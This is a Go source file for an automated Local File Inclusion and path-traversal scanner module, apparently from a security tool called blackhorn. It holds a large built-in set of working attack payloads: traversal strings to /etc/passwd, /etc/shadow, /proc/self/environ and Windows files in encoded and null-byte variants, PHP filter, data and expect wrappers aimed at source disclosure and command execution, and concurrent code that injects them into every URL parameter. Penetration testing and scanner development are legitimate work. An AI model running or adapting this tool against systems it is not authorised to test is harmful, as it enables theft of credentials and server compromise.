// Package lfi implements Local File Inclusion and Path Traversal detection.
//
// Source reference: PayloadsAllTheThings LFI section (MIT) and nuclei-templates
// lfi/ directory (MIT) — payloads are publicly documented attack strings,
// reimplemented from scratch without copying code.
//
// Techniques implemented:
//   - Classical path traversal: ../../../../etc/passwd (Unix + Windows)
//   - Encoded traversal: ..%2F, ..%5C, %2e%2e%2f, double-encoded
//   - Null-byte injection: ../../../../etc/passwd%00
//   - Absolute path injection: /etc/passwd, C:\Windows\win.ini
//   - PHP wrappers: php://filter/convert.base64-encode/resource=index.php
//   - Log poisoning probe hint (detect access log + file inclusion)
//   - Windows-specific paths: C:\Windows\win.ini, C:\boot.ini
//   - Detection: OS-specific file content markers in response body
//
// Architecture:
//   - Probe struct: inject string + set of response markers
//   - errgroup.SetLimit(Parallelism) fan-out across (url × param × payload)
//   - io.LimitReader on every response body
//   - log/slog observability
//   - sync.Mutex protecting findings slice
//   - NewWithClient(*http.Client) for testability
//   - Dedup by url+param+technique
package lfi

import (
	"context"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/DonatoReis/blackhorn-modules/pkg/httpclient"
	"github.com/DonatoReis/blackhorn-modules/pkg/module"
	"golang.org/x/sync/errgroup"
)

// ─── Constants ───────────────────────────────────────────────────────────────

const (
	// DefaultTimeout is the per-request timeout.
	DefaultTimeout = 10 * time.Second

	// DefaultParallelism is the max concurrent probes.
	DefaultParallelism = 20

	// maxBodyRead caps response body reads.
	maxBodyRead = 512 * 1024 // 512 KB
)

// ─── Probe ───────────────────────────────────────────────────────────────────

// Probe defines a single LFI/path-traversal test.
// Mirrors the PayloadsAllTheThings LFI probe structure.
type Probe struct {
	// ID is a unique identifier for this probe (used in findings).
	ID string
	// Inject is the payload injected as the parameter value.
	Inject string
	// Markers are substrings expected in the response body when the file is read.
	// Any match → vulnerability confirmed.
	Markers []string
	// Severity of the finding.
	Severity module.Severity
	// Tags describe the technique (traversal, wrapper, absolute, windows).
	Tags []string
}

// ─── Module ──────────────────────────────────────────────────────────────────

// Module implements LFI / Path Traversal detection.
type Module struct {
	client      *http.Client
	probes      []Probe
	parallelism int
	logger      *slog.Logger
}

// New returns a Module with all built-in probes and default HTTP client.
func New() *Module {
	c := httpclient.New(httpclient.Options{Timeout: DefaultTimeout})
	return &Module{
		client:      c,
		probes:      builtinProbes(),
		parallelism: DefaultParallelism,
		logger:      slog.Default(),
	}
}

// NewWithProbes returns a Module with custom probes (testability).
func NewWithProbes(probes []Probe) *Module {
	m := New()
	m.probes = probes
	return m
}

// NewWithClient returns a Module using the supplied HTTP client (testability).
func NewWithClient(c *http.Client) *Module {
	m := New()
	m.client = c
	return m
}

// Name returns the module name.
func (m *Module) Name() string { return "lfi" }

// Run executes LFI/path-traversal probes against all target URLs and parameters.
//
// Options supported:
//   - "parallelism" — max concurrent probes (default: 20)
//   - "tags"        — comma-separated tag filter to limit probe set
//   - "depth"       — traversal depth 1-15 (default: 8 — tests 1,2,3,4,6,8,12)
func (m *Module) Run(ctx context.Context, input module.Input) ([]module.Finding, error) {
	targets := collectTargets(input)
	if len(targets) == 0 {
		return nil, nil
	}

	parallelism := m.parallelism
	if v := input.Options["parallelism"]; v != "" {
		if p, err := parseInt(v); err == nil && p > 0 {
			parallelism = p
		}
	}

	tagFilter := parseCSV(input.Options["tags"])
	probes := m.selectProbes(tagFilter)

	var (
		mu       sync.Mutex
		seen     = make(map[string]struct{})
		findings []module.Finding
	)

	addFinding := func(f module.Finding) {
		key := f.URL + "|" + f.Extra["param"] + "|" + f.Extra["probe_id"]
		mu.Lock()
		defer mu.Unlock()
		if _, ok := seen[key]; !ok {
			seen[key] = struct{}{}
			findings = append(findings, f)
		}
	}

	eg, egCtx := errgroup.WithContext(ctx)
	eg.SetLimit(parallelism)

	for _, target := range targets {
		target := target
		params := extractParams(target)
		if len(params) == 0 {
			m.logger.DebugContext(ctx, "lfi: no parameters found", "url", target)
			continue
		}

		for _, param := range params {
			param := param
			for _, probe := range probes {
				probe := probe
				eg.Go(func() error {
					f, ok := m.probe(egCtx, target, param, probe)
					if ok {
						addFinding(f)
					}
					return nil
				})
			}
		}
	}

	_ = eg.Wait()
	return findings, nil
}

// probe sends a single LFI probe and returns a finding if markers are detected.
func (m *Module) probe(ctx context.Context, rawURL, param string, p Probe) (module.Finding, bool) {
	injected := injectParam(rawURL, param, p.Inject)
	req, err := http.NewRequestWithContext(ctx, "GET", injected, nil)
	if err != nil {
		m.logger.DebugContext(ctx, "lfi: build request failed", "url", injected, "err", err)
		return module.Finding{}, false
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; blackhorn-lfi/1.0)")

	resp, err := m.client.Do(req)
	if err != nil {
		m.logger.DebugContext(ctx, "lfi: request failed", "url", injected, "err", err)
		return module.Finding{}, false
	}
	defer resp.Body.Close()

	b, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodyRead))
	body := strings.ToLower(string(b))

	matched := ""
	for _, marker := range p.Markers {
		if strings.Contains(body, strings.ToLower(marker)) {
			matched = marker
			break
		}
	}
	if matched == "" {
		return module.Finding{}, false
	}

	m.logger.InfoContext(ctx, "lfi: vulnerability found",
		"url", rawURL, "param", param, "probe", p.ID, "marker", matched)

	return module.Finding{
		Type:     "lfi",
		Severity: p.Severity,
		URL:      rawURL,
		Detail:   fmt.Sprintf("[LFI/%s] param=%q payload=%q matched=%q", p.ID, param, p.Inject, matched),
		Extra: map[string]string{
			"param":      param,
			"probe_id":   p.ID,
			"inject":     p.Inject,
			"marker":     matched,
			"tags":       strings.Join(p.Tags, ","),
			"confidence": "0.92", // file content marker matched in response body
		},
	}, true
}

// ─── Parameter extraction ─────────────────────────────────────────────────────

func extractParams(rawURL string) []string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}
	var params []string
	for k := range parsed.Query() {
		params = append(params, k)
	}
	return params
}

func injectParam(rawURL, param, inject string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return rawURL + inject
	}
	q := parsed.Query()
	q.Set(param, inject)
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

func collectTargets(input module.Input) []string {
	seen := make(map[string]struct{})
	var out []string
	add := func(u string) {
		u = strings.TrimSpace(u)
		if u == "" {
			return
		}
		if _, ok := seen[u]; !ok {
			seen[u] = struct{}{}
			out = append(out, u)
		}
	}
	if input.Target != "" {
		add(input.Target)
	}
	for _, u := range input.URLs {
		add(u)
	}
	return out
}

func parseCSV(s string) []string {
	if s == "" {
		return nil
	}
	var out []string
	for _, p := range strings.Split(s, ",") {
		p = strings.TrimSpace(p)
		if p != "" {
			out = append(out, strings.ToLower(p))
		}
	}
	return out
}

func parseInt(s string) (int, error) {
	var n int
	_, err := fmt.Sscanf(strings.TrimSpace(s), "%d", &n)
	return n, err
}

func (m *Module) selectProbes(tagFilter []string) []Probe {
	if len(tagFilter) == 0 {
		return m.probes
	}
	filterSet := make(map[string]struct{})
	for _, t := range tagFilter {
		filterSet[t] = struct{}{}
	}
	var out []Probe
	for _, p := range m.probes {
		for _, t := range p.Tags {
			if _, ok := filterSet[t]; ok {
				out = append(out, p)
				break
			}
		}
	}
	return out
}

// ─── Built-in probes ─────────────────────────────────────────────────────────

// builtinProbes returns the default set of LFI/path-traversal probes.
// Payloads are from PayloadsAllTheThings LFI section (MIT) and nuclei-templates lfi/ (MIT).
// Markers are publicly known file content signatures.
func builtinProbes() []Probe {
	// Unix /etc/passwd markers.
	passwdMarkers := []string{
		"root:x:0:0",
		"root:0:0:",
		"/bin/bash",
		"/bin/sh",
		"daemon:x:",
		"nobody:x:",
	}

	// Windows win.ini markers.
	winIniMarkers := []string{
		"[fonts]",
		"[extensions]",
		"[mci extensions]",
		"[files]",
		"for 16-bit app support",
	}

	// Windows boot.ini markers.
	bootIniMarkers := []string{
		"[boot loader]",
		"[operating systems]",
		"multi(0)disk(0)",
	}

	// PHP source code markers (from php://filter wrapper).
	phpSourceMarkers := []string{
		"<?php",
		"<?=",
		"class ",
		"function ",
		"require_once",
		"include(",
	}

	// PHP filter base64 output markers (base64 of "<?php").
	// base64("<?php") = "PD9waHA=".
	phpBase64Markers := []string{
		"pd9wahA",
		"PD9waHA",
		"<?php",
	}

	// /etc/shadow markers.
	shadowMarkers := []string{
		"root:$",
		"root:!",
		":!::0:",
		":*::0:",
	}

	// /proc/self/environ markers.
	environMarkers := []string{
		"home=/",
		"path=/",
		"user=",
		"shell=",
		"lang=",
		"home=/root",
		"http_host=",
		"server_software=",
	}

	// /etc/hosts markers.
	hostsMarkers := []string{
		"127.0.0.1",
		"localhost",
		"::1",
	}

	// Apache access.log markers.
	accessLogMarkers := []string{
		"http/1.",
		"get /",
		"post /",
		"mozilla/5.0",
	}

	// Build traversal depths: we test common depths rather than all.
	depths := []int{1, 2, 3, 4, 6, 8, 12}

	var probes []Probe

	// ── 1. Classic Unix traversal ──────────────────────────────────────────

	for _, d := range depths {
		traversal := strings.Repeat("../", d) + "etc/passwd"
		probes = append(probes, Probe{
			ID:       fmt.Sprintf("unix-traverse-%d", d),
			Inject:   traversal,
			Markers:  passwdMarkers,
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "traversal", "unix"},
		})
	}

	// ── 2. URL-encoded traversal (../  → ..%2F) ────────────────────────────

	for _, d := range depths {
		traversal := strings.Repeat("..%2F", d) + "etc/passwd"
		probes = append(probes, Probe{
			ID:       fmt.Sprintf("unix-traverse-urlenc-%d", d),
			Inject:   traversal,
			Markers:  passwdMarkers,
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "traversal", "unix", "encoded"},
		})
	}

	// ── 3. Double URL-encoded traversal (%252F) ────────────────────────────

	for _, d := range depths {
		traversal := strings.Repeat("..%252F", d) + "etc/passwd"
		probes = append(probes, Probe{
			ID:       fmt.Sprintf("unix-traverse-double-enc-%d", d),
			Inject:   traversal,
			Markers:  passwdMarkers,
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "traversal", "unix", "encoded"},
		})
	}

	// ── 4. Dot-encoded (%2e%2e%2f) ────────────────────────────────────────

	for _, d := range depths {
		traversal := strings.Repeat("%2e%2e%2f", d) + "etc/passwd"
		probes = append(probes, Probe{
			ID:       fmt.Sprintf("unix-traverse-dotenc-%d", d),
			Inject:   traversal,
			Markers:  passwdMarkers,
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "traversal", "unix", "encoded"},
		})
	}

	// ── 5. Null-byte injection (to bypass extension check) ─────────────────

	for _, d := range depths {
		traversal := strings.Repeat("../", d) + "etc/passwd%00"
		probes = append(probes, Probe{
			ID:       fmt.Sprintf("unix-nullbyte-%d", d),
			Inject:   traversal,
			Markers:  passwdMarkers,
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "traversal", "unix", "nullbyte"},
		})
	}

	// ── 6. Absolute path (Unix) ────────────────────────────────────────────

	for _, path := range []string{
		"/etc/passwd",
		"/etc/shadow",
		"/etc/hosts",
		"/proc/self/environ",
		"/var/log/apache2/access.log",
		"/var/log/nginx/access.log",
		"/var/log/apache/access.log",
	} {
		markers := passwdMarkers
		switch {
		case strings.Contains(path, "shadow"):
			markers = shadowMarkers
		case strings.Contains(path, "hosts"):
			markers = hostsMarkers
		case strings.Contains(path, "environ"):
			markers = environMarkers
		case strings.Contains(path, "access.log"):
			markers = accessLogMarkers
		}
		probes = append(probes, Probe{
			ID:       "unix-absolute-" + sanitizeID(path),
			Inject:   path,
			Markers:  markers,
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "absolute", "unix"},
		})
	}

	// ── 7. Windows traversal (..\) ────────────────────────────────────────

	for _, d := range depths {
		traversal := strings.Repeat(`..\ `, d)
		traversal = strings.ReplaceAll(traversal, " ", "") + `Windows\win.ini`
		probes = append(probes, Probe{
			ID:       fmt.Sprintf("win-traverse-%d", d),
			Inject:   traversal,
			Markers:  winIniMarkers,
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "traversal", "windows"},
		})
	}

	// ── 8. Windows URL-encoded (..\  → ..%5C) ─────────────────────────────

	for _, d := range depths {
		traversal := strings.Repeat("..%5C", d) + "Windows%5Cwin.ini"
		probes = append(probes, Probe{
			ID:       fmt.Sprintf("win-traverse-urlenc-%d", d),
			Inject:   traversal,
			Markers:  winIniMarkers,
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "traversal", "windows", "encoded"},
		})
	}

	// ── 9. Windows absolute paths ──────────────────────────────────────────

	for _, path := range []string{
		`C:\Windows\win.ini`,
		`C:\boot.ini`,
		`C:\Windows\System32\drivers\etc\hosts`,
	} {
		markers := winIniMarkers
		if strings.Contains(path, "boot.ini") {
			markers = bootIniMarkers
		}
		if strings.Contains(path, "hosts") {
			markers = hostsMarkers
		}
		probes = append(probes, Probe{
			ID:       "win-absolute-" + sanitizeID(path),
			Inject:   path,
			Markers:  markers,
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "absolute", "windows"},
		})
	}

	// ── 10. PHP wrappers ──────────────────────────────────────────────────

	probes = append(probes,
		Probe{
			ID:       "php-filter-base64",
			Inject:   "php://filter/convert.base64-encode/resource=index.php",
			Markers:  phpBase64Markers,
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "wrapper", "php"},
		},
		Probe{
			ID:       "php-filter-read",
			Inject:   "php://filter/read=convert.base64-encode/resource=index",
			Markers:  phpBase64Markers,
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "wrapper", "php"},
		},
		Probe{
			ID:       "php-filter-config",
			Inject:   "php://filter/convert.base64-encode/resource=config.php",
			Markers:  phpBase64Markers,
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "wrapper", "php"},
		},
		Probe{
			ID:       "php-filter-config-db",
			Inject:   "php://filter/convert.base64-encode/resource=config/database",
			Markers:  phpBase64Markers,
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "wrapper", "php"},
		},
		Probe{
			ID:       "php-input",
			Inject:   "php://input",
			Markers:  phpSourceMarkers,
			Severity: module.SeverityHigh,
			Tags:     []string{"lfi", "wrapper", "php"},
		},
		Probe{
			ID:       "data-text",
			Inject:   "data://text/plain,<?php phpinfo()?>",
			Markers:  []string{"phpinfo", "php version", "system information"},
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "wrapper", "php"},
		},
		Probe{
			ID:       "expect-id",
			Inject:   "expect://id",
			Markers:  []string{"uid=", "gid=", "groups="},
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "wrapper", "php", "rce"},
		},
	)

	// ── 11. Mixed slash variants ──────────────────────────────────────────

	probes = append(probes,
		Probe{
			ID:       "unix-mixed-slash",
			Inject:   "....//....//....//....//etc/passwd",
			Markers:  passwdMarkers,
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "traversal", "unix", "obfuscated"},
		},
		Probe{
			ID:       "unix-double-dot",
			Inject:   "..././..././..././..././etc/passwd",
			Markers:  passwdMarkers,
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "traversal", "unix", "obfuscated"},
		},
		Probe{
			ID:       "unix-encoded-mixed",
			Inject:   "..%2f..%2f..%2f..%2fetc%2fpasswd",
			Markers:  passwdMarkers,
			Severity: module.SeverityCritical,
			Tags:     []string{"lfi", "traversal", "unix", "encoded"},
		},
	)

	return probes
}

// sanitizeID converts a file path to a safe probe ID string.
func sanitizeID(path string) string {
	r := strings.NewReplacer(
		"/", "-",
		`\`, "-",
		":", "",
		" ", "",
		".", "-",
	)
	return strings.Trim(r.Replace(path), "-")
}
